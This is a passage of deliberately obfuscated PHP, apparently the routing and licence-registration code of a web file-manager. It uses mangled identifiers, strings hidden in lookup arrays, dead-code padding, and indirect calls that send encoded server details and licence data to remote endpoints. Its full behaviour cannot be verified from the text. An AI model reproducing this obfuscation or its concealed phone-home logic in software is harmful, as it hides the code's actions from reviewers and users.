$this->metaSet($¨Ë¯î[$ÓÓ÷óÏğ[191]], $ÓÓ÷óÏğ[585], null); unset($¨Ë¯î[$ÓÓ÷óÏğ[515]][$ÓÓ÷óÏğ[583]]); continue; } $ÖÚæçä† = $¨Ë¯î[$ÓÓ÷óÏğ[515]][$ÓÓ÷óÏğ[583]]; $¨Ë¯î[$ÓÓ÷óÏğ[515]][$ÓÓ÷óÏğ[586]] = Model($ÓÓ÷óÏğ[575])->getInfoSimpleOuter($ÖÚæçä†); } } unset($¨Ë¯î); } public function parentLevelArray($ûÛ´èíº) { $ó«õ°ŸÇ =& $_SERVER[‚ûòÉ˜ş]; $ûÛ´èíº = explode($ó«õ°ŸÇ[60], trim($ûÛ´èíº, $ó«õ°ŸÇ[60])); return array_remove_value($ûÛ´èíº, $ó«õ°ŸÇ[222]); } public function listAll($ÈŠı‡ù) { $·ãÄÄı¡ =& $_SERVER[‚ûòÉ˜ş]; $„ë‰“Éì = $this->sourceInfo($ÈŠı‡ù); $ªÎé’ÖØ = array($·ãÄÄı¡[587] => array($·ãÄÄı¡[588], $„ë‰“Éì[$·ãÄÄı¡[561]] . $ÈŠı‡ù . $·ãÄÄı¡[589]), $·ãÄÄı¡[590] => 0); $¶™ÔŒ¨÷ = $·ãÄÄı¡[591]; $“©’íª­ = "\x4c\x45\x46\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\x5f\146\151\x6c\145\x20\146\151\154\145\x20\x6f\x6e\40\x73\x6f\x75\x72\143\x65\56\146\151\x6c\x65\x49\x44\40\x3d\40\146\x69\x6c\x65\56\x66\151\x6c\x65\111\x44"; $éÉİ²¯« = $this->alias($·ãÄÄı¡[495])->field($¶™ÔŒ¨÷)->where($ªÎé’ÖØ)->join($“©’íª­)->select(); $this->_listAppendAuth($éÉİ²¯«); $this->_listAppendUser($éÉİ²¯«); $this->_listAppendPath($éÉİ²¯«); $éÉİ²¯« = array_to_keyvalue($éÉİ²¯«, $·ãÄÄı¡[191]); $ÉòßŞîó = "\57{$„ë‰“Éì[$·ãÄÄı¡[42]]}\57"; $ÉòßŞîó = $ÉòßŞîó == $·ãÄÄı¡[569] ? $·ãÄÄı¡[8] : $ÉòßŞîó; $ÙŸşµ¡ô = array(); foreach ($éÉİ²¯« as $»…àÚÈ½ => $¯Á®’şñ) { $£”ÈÊÛ… = $this->parentLevelArray($¯Á®’şñ[$·ãÄÄı¡[561]]); array_shift($£”ÈÊÛ…); $ı÷š¢­Ë = $ÉòßŞîó; for ($ËÊ‘Ïİ = 0; $ËÊ‘Ïİ < count($£”ÈÊÛ…); $ËÊ‘Ïİ++) { $ı÷š¢­Ë .= $éÉİ²¯«[$£”ÈÊÛ…[$ËÊ‘Ïİ]][$·ãÄÄı¡[42]] . $·ãÄÄı¡[8]; } $ı÷š¢­Ë .= $¯Á®’şñ[$·ãÄÄı¡[42]]; if ($¯Á®’şñ[$·ãÄÄı¡[461]]) { $ı÷š¢­Ë .= $·ãÄÄı¡[8]; } $ ‘Æß½· = array($·ãÄÄı¡[471] => str_replace($·ãÄÄı¡[569], $·ãÄÄı¡[8], str_replace($·ãÄÄı¡[569], $·ãÄÄı¡[8], str_replace($·ãÄÄı¡[569], $·ãÄÄı¡[8], $ı÷š¢­Ë))), $·ãÄÄı¡[592] => intval($¯Á®’şñ[$·ãÄÄı¡[461]]), $·ãÄÄı¡[593] => intval($¯Á®’şñ[$·ãÄÄı¡[86]]), $·ãÄÄı¡[95] => intval($¯Á®’şñ[$·ãÄÄı¡[95]]), $·ãÄÄı¡[97] => $this->pathInfoFilter($¯Á®’şñ)); if (!$ ‘Æß½·[$·ãÄÄı¡[461]]) { $ ‘Æß½·[$·ãÄÄı¡[517]] = $¯Á®’şñ[$·ãÄÄı¡[517]]; } $ÙŸşµ¡ô[] = $ ‘Æß½·; } $ÙŸşµ¡ô = array_sort_by($ÙŸşµ¡ô, $·ãÄÄı¡[94]); return $ÙŸşµ¡ô; } } goto f’î’£³é°; bÜ…„™¶ÔÙ: while ($xvpnwlerah < $_SERVER[‚ûòÉ˜ş][660]) { if ($xvpnwlerah >= 0) { break; } $xvpnwlerah++; } class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\x69\x6e\144\145\x78"; function __construct() { } public function setDefault($ßÄ’Íü•) { $öÏùıÇ§ =& $_SERVER[‚ûòÉ˜ş]; $ÚèúÉ˜ =& $_SERVER[ºï·Óû­]; $é‡áõœç = explode($ÚèúÉ˜[0], trim($ßÄ’Íü•, $ÚèúÉ˜[0])); $Â¤ş¡ˆ = $öÏùıÇ§[661]; if (strlen($Â¤ş¡ˆ) < $öÏùıÇ§[19]) { return; } $this->defaultModule = $é‡áõœç[0] ? $é‡áõœç[0] : $this->defaultModule; $this->defaultController = $é‡áõœç[1] ? $é‡áõœç[1] : $this->defaultController; $¡”ƒØ®á = $öÏùıÇ§[662]; if (strlen($¡”ƒØ®á) < $öÏùıÇ§[663]) { die; } $this->defaultAction = $é‡áõœç[2] ? $é‡áõœç[2] : $this->defaultAction; $this->jlwc31645c16($ÚèúÉ˜[1], array($this, $ÚèúÉ˜[2])); } public function appRun($´ı‹…Å) { $µ·şµÙ  =& $_SERVER[‚ûòÉ˜ş]; $¾İğÕòÛ =& $_SERVER[ºï·Óû­]; $ÊÉÈëşğ = explode($¾İğÕòÛ[0], $´ı‹…Å); $ŒéãÉ¨÷ = $µ·şµÙ [664]; if (strlen($ŒéãÉ¨÷) < $µ·şµÙ [665]) { return; } $ÄğŸşá = strtolower($ÊÉÈëşğ[0]); $Í±ş¤ß = $µ·şµÙ [666]; if (!$Í±ş¤ß) { return; } $™ıŠ¦ï = $¾İğÕòÛ[3]; if ($ÄğŸşá == $¾İğÕòÛ[4]) { $™ıŠ¦ï = $¾İğÕòÛ[5]; $ÊÉÈëşğ[0] = $¾İğÕòÛ[6]; $ÊÉÈëşğ[1] = $ÊÉÈëşğ[1] . $¾İğÕòÛ[7]; $´ı‹…Å = join($¾İğÕòÛ[0], $ÊÉÈëşğ); $´ı‹…Å = trim($´ı‹…Å, $¾İğÕòÛ[0]); } call_user_func(array($¾İğÕòÛ[8], $¾İğÕòÛ[9]), $™ıŠ¦ï . $¾İğÕòÛ[10], $´ı‹…Å); ActionCall($´ı‹…Å); call_user_func(array($¾İğÕòÛ[8], $¾İğÕòÛ[9]), $™ıŠ¦ï . $¾İğÕòÛ[11], $´ı‹…Å); $š†¥³Î = $µ·şµÙ [667]; } private function autorun() { $‡‘í· =& $_SERVER[ºï·Óû­]; global $config; if (count($config[$‡‘í·[12]]) == 0) { return; } foreach ($config[$‡‘í·[12]] as $†óÉè¶Æ => $é­Æòø) { $this->appRun($é­Æòø); $¨ˆ™¤å» = $_SERVER[‚ûòÉ˜ş][668]; } } private function xumv4d16ac34() { $ïŞ•«Éà =& $_SERVER[‚ûòÉ˜ş]; $•¤èÁˆü =& $_SERVER[ºï·Óû­]; $´¼´¥ûƒ = $•¤èÁˆü[4]; $úÒÙ‰ç = $ïŞ•«Éà[669]; if (!$úÒÙ‰ç) { return; } $–˜™Ç = $GLOBALS[$•¤èÁˆü[13]][$•¤èÁˆü[14]][0]; $‘¹èå§‘ = $ïŞ•«Éà[670]; while ($‘¹èå§‘ < $ïŞ•«Éà[663]) { if ($‘¹èå§‘ >= 0) { break; } $‘¹èå§‘++; } if (!$–˜™Ç || strlen($–˜™Ç) <= strlen($´¼´¥ûƒ)) { return; } if (strtolower(substr($–˜™Ç, -strlen($´¼´¥ûƒ))) != $´¼´¥ûƒ) { return; } $ôí¬€³ = substr($–˜™Ç, 0, -strlen($´¼´¥ûƒ)); $õœ²æ‘ë = array($•¤èÁˆü[4], $ôí¬€³); $¤–‹Ôä¶ = $ïŞ•«Éà[671]; if (strlen($¤–‹Ôä¶) < $ïŞ•«Éà[663]) { return; } $ ­Â÷¦î = array_slice($GLOBALS[$•¤èÁˆü[13]][$•¤èÁˆü[14]], 1); $GLOBALS[$•¤èÁˆü[13]][$•¤èÁˆü[14]] = array_merge($õœ²æ‘ë, $ ­Â÷¦î); $©©Êî‰® = $ïŞ•«Éà[672]; $GLOBALS[$•¤èÁˆü[13]][$•¤èÁˆü[15]] = implode($•¤èÁˆü[0], $GLOBALS[$•¤èÁˆü[13]][$•¤èÁˆü[14]]); } private function onura1db4c40() { $á¸åÑ°ô =& $_SERVER[‚ûòÉ˜ş]; $Û»Ô—Ô„ =& $_SERVER[ºï·Óû­]; if ($GLOBALS[$Û»Ô—Ô„[13]][$Û»Ô—Ô„[15]] != $Û»Ô—Ô„[6]) { return; } $Øˆä²¯ = $_SERVER[$Û»Ô—Ô„[16]]; $‹Åî÷ĞÕ = $á¸åÑ°ô[673]; $Ù©Ò•—ø = $Û»Ô—Ô„[17]; if (!strstr($Øˆä²¯, $Ù©Ò•—ø)) { return; } $æ–“ˆáÓ = strrpos($Øˆä²¯, $Ù©Ò•—ø); $ŒüõÒÏ = $á¸åÑ°ô[674]; $š§‘¶­‚ = substr($Øˆä²¯, $æ–“ˆáÓ + strlen($Ù©Ò•—ø)); $‰õˆÜ¬í = $á¸åÑ°ô[675]; while (strlen($‰õˆÜ¬í) < $á¸åÑ°ô[676]) { if (!$‰õˆÜ¬í) { break; } $‰õˆÜ¬í++; } preg_match_all($Û»Ô—Ô„[18], $š§‘¶­‚, $“÷›ëÛï); $éå£±ù“ = $á¸åÑ°ô[677]; if (!$éå£±ù“) { die; } $š§‘¶­‚ = trim($“÷›ëÛï[0][0], $Û»Ô—Ô„[19]); $ÁÅ¼­å = $á¸åÑ°ô[678]; $GLOBALS[$Û»Ô—Ô„[13]][$Û»Ô—Ô„[14]] = explode($Û»Ô—Ô„[19], $š§‘¶­‚); $û·Ç¤È§ = $á¸åÑ°ô[679]; if (!$û·Ç¤È§) { die; } $GLOBALS[$Û»Ô—Ô„[13]][$Û»Ô—Ô„[15]] = implode($Û»Ô—Ô„[0], $GLOBALS[$Û»Ô—Ô„[13]][$Û»Ô—Ô„[14]]); $ƒ£¯šôä = $á¸åÑ°ô[680]; if (!$ƒ£¯šôä) { return; } } public function run() { $è„Èá¶˜ =& $_SERVER[‚ûòÉ˜ş]; $ÍÇ­¡Öâ =& $_SERVER[ºï·Óû­]; $this->onura1db4c40(); $this->xumv4d16ac34(); $‡‹À·ÅÆ = $GLOBALS[$ÍÇ­¡Öâ[13]][$ÍÇ­¡Öâ[14]]; $Òğ®ø³â = $GLOBALS[$ÍÇ­¡Öâ[13]][$ÍÇ­¡Öâ[15]]; $í‘òğóÉ = $è„Èá¶˜[681]; define($ÍÇ­¡Öâ[20], isset($‡‹À·ÅÆ[0]) && $‡‹À·ÅÆ[0] ? $‡‹À·ÅÆ[0] : $this->defaultModule); $ñ¥î² = $è„Èá¶˜[682]; if (!$ñ¥î²) { return; } define($ÍÇ­¡Öâ[21], isset($‡‹À·ÅÆ[1]) && $‡‹À·ÅÆ[0] ? $‡‹À·ÅÆ[1] : $this->defaultController); $Éû¦Şç  = $è„Èá¶˜[683]; if (!$Éû¦Şç ) { return; } define($ÍÇ­¡Öâ[22], isset($‡‹À·ÅÆ[2]) && $‡‹À·ÅÆ[0] ? $‡‹À·ÅÆ[2] : $this->defaultAction); define($ÍÇ­¡Öâ[23], MOD . $ÍÇ­¡Öâ[0] . ST . $ÍÇ­¡Öâ[0] . ACT); $üÖÉÅ‹Ñ = $è„Èá¶˜[684]; if (!$üÖÉÅ‹Ñ) { return; } $_SERVER[$ÍÇ­¡Öâ[24]] = strtolower(ACTION); $this->autorun(); $ú´êÈ = $è„Èá¶˜[685]; if (count($‡‹À·ÅÆ) >= 3) { $this->appRun($Òğ®ø³â); } else { $this->appRun(ACTION); } } private $cfrib5593c42 = array(); private $dxty82d39e70 = ''; public function lpdx007f3eed() { $õíÉ§™ =& $_SERVER[‚ûòÉ˜ş]; $£™œÏ£¸ =& $_SERVER[ºï·Óû­]; $this->wlmr9def8044(); $this->ngli2eba0f54(); $this->qzxkcf454453(); $§Ûœîû’ = $õíÉ§™[686]; while ($§Ûœîû’ < $õíÉ§™[676]) { if ($§Ûœîû’ >= 0) { break; } $§Ûœîû’++; } $this->mewb23b9f546(); $this->mopv5a1b4962(); $this->muko396d3d32(); $this->gwjtd7a0fce0(); $this->jlwc31645c16($£™œÏ£¸[25], array($this, $£™œÏ£¸[26])); $¶‹ûë•Ù = $õíÉ§™[687]; if (!$¶‹ûë•Ù) { die; } $this->jlwc31645c16($£™œÏ£¸[27], array($this, $£™œÏ£¸[28])); $this->jlwc31645c16($£™œÏ£¸[29], array($this, $£™œÏ£¸[30])); $this->jlwc31645c16($£™œÏ£¸[31], array($this, $£™œÏ£¸[32])); } public function jwznc7569c17($»ªûåˆÌ) { $Àœ½‡ø¬ =& $_SERVER[‚ûòÉ˜ş]; $¥Û™ó’ú =& $_SERVER[ºï·Óû­]; $ü÷ ‰« = Model($¥Û™ó’ú[33])->get(); $×´äÄï = array($¥Û™ó’ú[34], $¥Û™ó’ú[35], $¥Û™ó’ú[36], $¥Û™ó’ú[37], $¥Û™ó’ú[38], $¥Û™ó’ú[39], $¥Û™ó’ú[40], $¥Û™ó’ú[41], $¥Û™ó’ú[42], $¥Û™ó’ú[43], $¥Û™ó’ú[44], $¥Û™ó’ú[45], $¥Û™ó’ú[46], $¥Û™ó’ú[47], $¥Û™ó’ú[48], $¥Û™ó’ú[49], $¥Û™ó’ú[50], $¥Û™ó’ú[51], $¥Û™ó’ú[52], $¥Û™ó’ú[53], $¥Û™ó’ú[54], $¥Û™ó’ú[55], $¥Û™ó’ú[56], $¥Û™ó’ú[57], $¥Û™ó’ú[58], $¥Û™ó’ú[59], $¥Û™ó’ú[60], $¥Û™ó’ú[61], $¥Û™ó’ú[62], $¥Û™ó’ú[63], $¥Û™ó’ú[64], $¥Û™ó’ú[65], $¥Û™ó’ú[66], $¥Û™ó’ú[67], $¥Û™ó’ú[68], $¥Û™ó’ú[69], $¥Û™ó’ú[70], $¥Û™ó’ú[71], $¥Û™ó’ú[72], $¥Û™ó’ú[73], $¥Û™ó’ú[74], $¥Û™ó’ú[75], $¥Û™ó’ú[76], $¥Û™ó’ú[77], $¥Û™ó’ú[78], $¥Û™ó’ú[79], $¥Û™ó’ú[80], $¥Û™ó’ú[81], $¥Û™ó’ú[82], $¥Û™ó’ú[83], $¥Û™ó’ú[84]); foreach ($×´äÄï as $îó‘¹™€) { $©ÇÄêµ¶ = $GLOBALS[$¥Û™ó’ú[85]][$¥Û™ó’ú[86]][$îó‘¹™€]; if (isset($ü÷ ‰«[$îó‘¹™€])) { $©ÇÄêµ¶ = $ü÷ ‰«[$îó‘¹™€]; } $»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[88]][$îó‘¹™€] = $©ÇÄêµ¶; } $–çĞæù = $»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[88]][$¥Û™ó’ú[46]]; unset($»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[89]][$¥Û™ó’ú[90]]); $Ü÷û§¢Š = $Àœ½‡ø¬[688]; unset($»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[89]][$¥Û™ó’ú[91]]); $µ¯—›æî = $Àœ½‡ø¬[689]; if (strlen($µ¯—›æî) < $Àœ½‡ø¬[663]) { return; } unset($»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[88]][$¥Û™ó’ú[46]]); unset($»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[88]][$¥Û™ó’ú[92]]); $¡ÎÍ¬Î½ = $Àœ½‡ø¬[690]; if (strlen($¡ÎÍ¬Î½) < $Àœ½‡ø¬[660]) { die; } $»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[88]][$¥Û™ó’ú[93]] = array($¥Û™ó’ú[94] => (int) $–çĞæù[$¥Û™ó’ú[95]], $¥Û™ó’ú[96] => (int) _get($–çĞæù, $¥Û™ó’ú[97], 0)); $‡§±¹ö‚ = substr(md5($¥Û™ó’ú[98] . get_client_ip() . $ü÷ ‰«[$¥Û™ó’ú[99]]), 0, 15); $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[101]] = Mcrypt::encode(Session::sign(), $‡§±¹ö‚, 3600 * 24); $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[102]] = Action($¥Û™ó’ú[103])->accessToken(); $»úİíË‘ = $Àœ½‡ø¬[691]; if (!$»úİíË‘) { die; } $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[104]] = md5($_SERVER[$¥Û™ó’ú[105]] . $ü÷ ‰«[$¥Û™ó’ú[99]]); $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[106]] = base64_encode(serverInfo()); $Ñë©Ì¢ô = $Àœ½‡ø¬[692]; if (!$Ñë©Ì¢ô) { die; } $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[107]] = $this->dxty82d39e70; if ($ü÷ ‰«[$¥Û™ó’ú[107]] != $¥Û™ó’ú[108]) { $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[109]] = $ü÷ ‰«[$¥Û™ó’ú[109]]; $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[110]] = $ü÷ ‰«[$¥Û™ó’ú[110]]; $Ñ”Öš¢¸ = rand_string(10) . $this->dxty82d39e70 . rand_string(5); $»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[111]][$¥Û™ó’ú[112]] = $this->qnax2456ce61($Ñ”Öš¢¸, $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[104]]); } if ($this->dxty82d39e70 == $¥Û™ó’ú[108]) { $»ªûåˆÌ[$¥Û™ó’ú[87]][$¥Û™ó’ú[88]][$¥Û™ó’ú[93]][$¥Û™ó’ú[97]] = 0; } $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[113]] = _get($this->cfrib5593c42, $¥Û™ó’ú[114], $¥Û™ó’ú[6]); $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[115]] = _get($this->cfrib5593c42, $¥Û™ó’ú[116], $¥Û™ó’ú[6]); if (_get($GLOBALS, $¥Û™ó’ú[117]) && $this->config[$¥Û™ó’ú[118]]) { $»ªûåˆÌ[$¥Û™ó’ú[100]][$¥Û™ó’ú[119]] = WEB_ROOT; } return $»ªûåˆÌ; } private function muko396d3d32() { $¯úšü²œ =& $_SERVER[‚ûòÉ˜ş]; $œ¦Í½úË =& $_SERVER[ºï·Óû­]; $äÈëâÙ¥ = $_SERVER[$œ¦Í½úË[24]] == $œ¦Í½úË[120]; if ($_SERVER[$œ¦Í½úË[24]] == $œ¦Í½úË[121] && $_GET[$œ¦Í½úË[122]] == $œ¦Í½úË[123]) { $äÈëâÙ¥ = !0; } if ($äÈëâÙ¥) { $«¶éÃÚ = array($œ¦Í½úË[107] => $this->dxty82d39e70, $œ¦Í½úË[124] => $this->wtuj09b58a45(), $œ¦Í½úË[125] => Model($œ¦Í½úË[126])->count()); if ($this->dxty82d39e70 != $œ¦Í½úË[108]) { $ğ÷ÃÊÜ¡ = _get($this->cfrib5593c42, $œ¦Í½úË[127]); if ($ğ÷ÃÊÜ¡) { $«¶éÃÚ[$œ¦Í½úË[128]] = $ğ÷ÃÊÜ¡; $«¶éÃÚ[$œ¦Í½úË[129]] = strtotime(_get($this->cfrib5593c42, $œ¦Í½úË[130])); $«¶éÃÚ[$œ¦Í½úË[131]] = _get($this->cfrib5593c42, $œ¦Í½úË[116]); } $È‹ù…Ì = Model($œ¦Í½úË[33])->get($œ¦Í½úË[132], $œ¦Í½úË[6], !0); if (is_string($È‹ù…Ì) && substr($È‹ù…Ì, 0, 1) == $œ¦Í½úË[133]) { $È‹ù…Ì = json_decode_force($È‹ù…Ì); } if (is_array($È‹ù…Ì) && $È‹ù…Ì[$œ¦Í½úË[134]] && strstr($È‹ù…Ì[$œ¦Í½úË[134]], $œ¦Í½úË[135])) { $ÂÒˆğìæ = explode($œ¦Í½úË[135], $È‹ù…Ì[$œ¦Í½úË[134]]); $«¶éÃÚ[$œ¦Í½úË[136]] = $ÂÒˆğìæ[0]; } } $«¶éÃÚ = $this->pnixd243fd28(json_encode($«¶éÃÚ), md5($œ¦Í½úË[137])); $òØ¦ù„š = $¯úšü²œ[693]; if (strlen($òØ¦ù„š) < $¯úšü²œ[19]) { die; } $ö”ß©»Æ = array($œ¦Í½úË[138] => $«¶éÃÚ); call_user_func(array($œ¦Í½úË[139], $œ¦Í½úË[140]), $ö”ß©»Æ); $î¼¾‹ÃÃ = $¯úšü²œ[694]; if (strlen($î¼¾‹ÃÃ) < $¯úšü²œ[663]) { die; } } if ($this->dxty82d39e70 == $œ¦Í½úË[108]) { return; } $éì´òâ = array($œ¦Í½úË[141], $œ¦Í½úË[142], $œ¦Í½úË[143], $œ¦Í½úË[144], $œ¦Í½úË[145], $œ¦Í½úË[146]); $Âü ¸ = $¯úšü²œ[695]; while ($Âü ¸ < $¯úšü²œ[660]) { if ($Âü ¸ >= 0) { break; } $Âü ¸++; } $æÅ­Â‡€ = Model($œ¦Í½úË[33])->get(); $¥Ê°Äª = $¯úšü²œ[696]; $ö”ß©»Æ = array($œ¦Í½úË[147] => $æÅ­Â‡€[$œ¦Í½úË[34]], $œ¦Í½úË[148] => $æÅ­Â‡€[$œ¦Í½úË[35]], $œ¦Í½úË[149] => $œ¦Í½úË[6]); $ÕÑ•È = $¯úšü²œ[697]; if (!$ÕÑ•È) { die; } foreach ($éì´òâ as $ñ¬›¢”ş) { if (!isset($æÅ­Â‡€[$ñ¬›¢”ş]) || !$æÅ­Â‡€[$ñ¬›¢”ş]) { continue; } $ö”ß©»Æ[$ñ¬›¢”ş] = $æÅ­Â‡€[$ñ¬›¢”ş]; } call_user_func(array($œ¦Í½úË[139], $œ¦Í½úË[140]), $ö”ß©»Æ); } private function mewb23b9f546() { $‘»İœÚ‰ =& $_SERVER[‚ûòÉ˜ş]; $±€Ğüú =& $_SERVER[ºï·Óû­]; if ($_SERVER[$±€Ğüú[24]] != $±€Ğüú[150]) { return; } if (!_get($GLOBALS, $±€Ğüú[117])) { die; } $¯¡À€ñó = $GLOBALS[$±€Ğüú[13]]; if (isset($¯¡À€ñó[$±€Ğüú[151]])) { $this->nipb645fa7bf(); die; } if (isset($¯¡À€ñó[$±€Ğüú[152]]) && isset($¯¡À€ñó[$±€Ğüú[152]]) == $±€Ğüú[123]) { $¯¡À€ñó[$±€Ğüú[153]] = Model($±€Ğüú[33])->get($±€Ğüú[154]); } if (!isset($¯¡À€ñó[$±€Ğüú[153]]) || strlen($¯¡À€ñó[$±€Ğüú[153]]) != 16) { show_json($±€Ğüú[155] . $¯¡À€ñó[$±€Ğüú[153]], !1); } $¹ûâïñ… = Model($±€Ğüú[33])->get($±€Ğüú[99]); $ø¢í§›¬ = md5($_SERVER[$±€Ğüú[105]] . $¹ûâïñ…); $§ìíŸÌ = array($±€Ğüú[153] => $¯¡À€ñó[$±€Ğüú[153]], $±€Ğüú[156] => rand_string(16), $±€Ğüú[157] => $±€Ğüú[137], $±€Ğüú[158] => $±€Ğüú[159], $±€Ğüú[160] => $_SERVER[$±€Ğüú[161]], $±€Ğüú[162] => $_SERVER[$±€Ğüú[163]], $±€Ğüú[164] => $_SERVER[$±€Ğüú[165]], $±€Ğüú[104] => $ø¢í§›¬, $±€Ğüú[166] => Model($±€Ğüú[33])->get($±€Ğüú[132])); if ($¯¡À€ñó[$±€Ğüú[167]] == $±€Ğüú[168]) { $¥ÅÁ‘ü¸ = $this->pnixd243fd28($ø¢í§›¬, $±€Ğüú[169]); $Î¨¹Ä¼ = $this->qnax2456ce61(json_encode($§ìíŸÌ), $ø¢í§›¬ . $±€Ğüú[170], 3); $Î¨¹Ä¼ = $Î¨¹Ä¼ . $±€Ğüú[171] . $_SERVER[$±€Ğüú[161]]; $ÇÊ¡ë§ñ = $this->iqnkab3de56f($±€Ğüú[172] . $¥ÅÁ‘ü¸ . $±€Ğüú[173] . $Î¨¹Ä¼, -1); show_json($ÇÊ¡ë§ñ, !0); } else { if ($¯¡À€ñó[$±€Ğüú[167]] == $±€Ğüú[174]) { $”ıñ£‡¡ = substr(md5($±€Ğüú[175] . $ø¢í§›¬), 12, 15) . $±€Ğüú[176]; $Î¨¹Ä¼ = $this->mrog1f375036(trim($¯¡À€ñó[$±€Ğüú[177]]), $”ıñ£‡¡, 2); $ÕÀãŠ„ = json_decode($Î¨¹Ä¼, !0); if (!is_array($ÕÀãŠ„) || !is_array($ÕÀãŠ„[$±€Ğüú[178]]) || $ÕÀãŠ„[$±€Ğüú[153]] != !0) { $Ò¸øÑù = $±€Ğüú[179]; $û¹‡Ö€ = $ÕÀãŠ„[$±€Ğüú[178]] ? $±€Ğüú[180] . $ÕÀãŠ„[$±€Ğüú[178]] : $Ò¸øÑù; show_json($û¹‡Ö€, !1); } else { $§ìíŸÌ[$±€Ğüú[156]] = $ÕÀãŠ„[$±€Ğüú[178]][$±€Ğüú[181]]; } } else { $ÕÀãŠ„ = $this->iqnkab3de56f($±€Ğüú[182], $§ìíŸÌ, 10); } } if (!is_array($ÕÀãŠ„) || !is_array($ÕÀãŠ„[$±€Ğüú[178]]) || $ÕÀãŠ„[$±€Ğüú[153]] != !0) { $Ò¸øÑù = LNG($±€Ğüú[183]); $û¹‡Ö€ = $ÕÀãŠ„[$±€Ğüú[178]] ? $±€Ğüú[180] . $ÕÀãŠ„[$±€Ğüú[178]] : $Ò¸øÑù; show_json($û¹‡Ö€, !1); } $§‘Û„¶± = $ÕÀãŠ„[$±€Ğüú[178]]; $ÖêÂë’õ = $this->uoft223a1968($§‘Û„¶±[$±€Ğüú[184]]); if (!$ÖêÂë’õ || $ÖêÂë’õ != $§‘Û„¶±[$±€Ğüú[130]]) { $ô‰ÉÛËÉ = array($±€Ğüú[185] => Model($±€Ğüú[33])->get($±€Ğüú[99]), $±€Ğüú[186] => $_SERVER[$±€Ğüú[105]], $±€Ğüú[187] => this_url(), $±€Ğüú[162] => $_SERVER[$±€Ğüú[163]]); $Î¨¹Ä¼ = $this->ajkbd04f9004(json_encode($ô‰ÉÛËÉ)); $this->iqnkab3de56f($±€Ğüú[188] . $Î¨¹Ä¼); show_json(LNG($±€Ğüú[189]), !0); } $å¡¬ØŸş = array($±€Ğüú[154] => $§‘Û„¶±[$±€Ğüú[190]], $±€Ğüú[191] => $§‘Û„¶±[$±€Ğüú[192]], $±€Ğüú[193] => rand_string(16), $±€Ğüú[107] => $§‘Û„¶±[$±€Ğüú[194]]); if ($§ìíŸÌ[$±€Ğüú[156]]) { $å¡¬ØŸş[$±€Ğüú[193]] = $§ìíŸÌ[$±€Ğüú[156]]; } $‚äš»õ÷ = substr(md5($å¡¬ØŸş[$±€Ğüú[191]]), 10, 10); $¦îµ£ø§ = $‚äš»õ÷ . $å¡¬ØŸş[$±€Ğüú[107]] . $å¡¬ØŸş[$±€Ğüú[193]]; $íµ¿Å»Ş = $‘»İœÚ‰[698]; if (strlen($íµ¿Å»Ş) < $‘»İœÚ‰[663]) { die; } $å¡¬ØŸş[$±€Ğüú[109]] = strrev(base64_encode($this->pnixd243fd28($¦îµ£ø§, $±€Ğüú[195]))); $íÆ¥ÑÊ = rand_string(16); $»ù²ş¸ = $íÆ¥ÑÊ . $å¡¬ØŸş[$±€Ğüú[107]] . $this->pnixd243fd28(md5($å¡¬ØŸş[$±€Ğüú[154]]), $íÆ¥ÑÊ); $şÕÖù³¥ = $‘»İœÚ‰[699]; if (!$şÕÖù³¥) { return; } $å¡¬ØŸş[$±€Ğüú[110]] = base64_encode(strrev($this->pnixd243fd28($»ù²ş¸, $±€Ğüú[196]))); if ($§‘Û„¶±[$±€Ğüú[197]] && $§‘Û„¶±[$±€Ğüú[197]] >= 1) { Model($±€Ğüú[33])->setDeep($±€Ğüú[198], $±€Ğüú[123]); } Model($±€Ğüú[33])->set($å¡¬ØŸş); $Çƒ¸êĞ¯ = md5($_SERVER[$±€Ğüú[105]] . strrev($¹ûâïñ…) . $å¡¬ØŸş[$±€Ğüú[191]]); $íÉ©†ŸÄ = strrev(substr($Çƒ¸êĞ¯, 10, 16)); $ïŒ¯Á = $‘»İœÚ‰[700]; $ğƒÊ…«“ = $this->qnax2456ce61(json_encode($§‘Û„¶±), $Çƒ¸êĞ¯); $á£¶ÀØ» = array_to_keyvalue(Model($±€Ğüú[7])->listData(), $±€Ğüú[199]); $â¶Œºò½ = $á£¶ÀØ»[$±€Ğüú[200]]; $å´ÛƒÔ = array(); $ö½÷§Ø = $‘»İœÚ‰[701]; while (strlen($ö½÷§Ø) < $‘»İœÚ‰[19]) { if (!$ö½÷§Ø) { break; } $ö½÷§Ø++; } $å´ÛƒÔ[$íÉ©†ŸÄ] = $ğƒÊ…«“; $Ø½è¥ì¢ = $‘»İœÚ‰[702]; if (strlen($Ø½è¥ì¢) < $‘»İœÚ‰[676]) { return; } Model($±€Ğüú[7])->update($â¶Œºò½[$±€Ğüú[201]], array($±€Ğüú[202] => $å´ÛƒÔ)); $¥³Ç¬¯Î = $‘»İœÚ‰[703]; if (!$¥³Ç¬¯Î) { return; } $this->cfrib5593c42 = $§‘Û„¶±; $«Ÿ¯Şòı = $‘»İœÚ‰[704]; if (strlen($«Ÿ¯Şòı) < $‘»İœÚ‰[19]) { return; } $this->dxty82d39e70 = $å¡¬ØŸş[$±€Ğüú[107]]; $this->licenseRegistSuccess(); Cache::set($±€Ğüú[203] . md5($¹ûâïñ… . 